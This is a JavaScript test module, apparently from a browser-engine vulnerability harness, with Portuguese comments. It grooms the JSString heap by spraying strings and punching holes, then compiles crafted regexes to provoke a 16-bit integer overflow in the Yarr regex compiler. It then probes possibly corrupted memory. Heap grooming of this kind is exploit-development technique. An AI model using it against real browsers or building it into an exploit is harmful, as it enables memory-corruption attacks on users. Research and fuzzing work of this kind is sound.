import { Groomer } from '../mod_groomer.js';
export default {
    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
    category: 'Boundary',
    risk:     'HIGH',
    description:
        'Ataques ao parser/compilador Yarr sem causar ReDoS. ' +
        'O JSString Heap é fragmentado antes da compilação para forçar ' +
        'o compilador a usar rotas lentas de memória (causando o transbordo de 16-bits).',

    setup: function() {
        this.results = {};
        this.regexps = {};
    },

    trigger: function() {

        // 🚨 Grooming Massivo do JSString Heap:
        // Poluímos a memória com strings pequenas e criamos buracos.
        // O motor Yarr será forçado a tentar alocar o seu array num ambiente caótico.
        let stringTrash = Groomer.sprayStrings(64, 5000);
        Groomer.punchHoles(stringTrash, 3);

        // A: Muitos grupos de captura (limite de 16-bits no Yarr antigo)
        try {
            const groups = '(a)'.repeat(0x10000); // 65536 grupos
            this.regexps.manyGroups = new RegExp(groups);
            this.results.manyGroupsExec = this.regexps.manyGroups.exec('a')?.length;
        } catch(e) { this.results.manyGroupsErr = e.constructor.name; }

        // B: Backreference além do limite de grupos
        try {
            this.regexps.deepBackref = new RegExp('(a)\\65536');
            this.results.deepBackrefExec = this.regexps.deepBackref.exec('a')?.length;
        } catch(e) { this.results.deepBackrefErr = e.constructor.name; }

        // C: Quantifier com valores near UINT32_MAX
        try {
            this.regexps.bigQuant = new RegExp('a{0,65535}');
            this.results.bigQuantExec = this.regexps.bigQuant.exec('')?.length;
        } catch(e) { this.results.bigQuantErr = e.constructor.name; }

        // D: Alternation com muitos branches 
        try {
            const alts = Array.from({ length: 1000 }, (_, i) => `alt${i}`).join('|');
            this.regexps.deepAlt = new RegExp(alts);
            this.results.deepAltExec = this.regexps.deepAlt.exec('alt999') ? 'matched' : 'nomatch';
        } catch(e) { this.results.deepAltErr = e.constructor.name; }

        // E: Grupos nomeados duplicados 
        try {
            this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
            this.results.dupNamedExec = this.regexps.dupNamed.exec('a')?.groups;
        } catch(e) { this.results.dupNamedErr = e.constructor.name; }
    },

    probe: [
        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr,
        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr,
        s => s.results.bigQuantExec     ?? s.results.bigQuantErr,
        s => s.results.deepAltExec      ?? s.results.deepAltErr,
        s => s.results.dupNamedExec     ?? s.results.dupNamedErr,

        // Acesso ao índice máximo da memória possivelmente corrompida
        s => { try { return s.regexps.manyGroups?.exec('a')?.[0xFFFF]; } catch(e) { return e.constructor.name; } },
        s => { try { return s.regexps.dupNamed?.exec('b')?.groups?.name; } catch(e) { return e.constructor.name; } },
    ],

    cleanup: function() {
        this.results = {};
        this.regexps = {};
    }
};
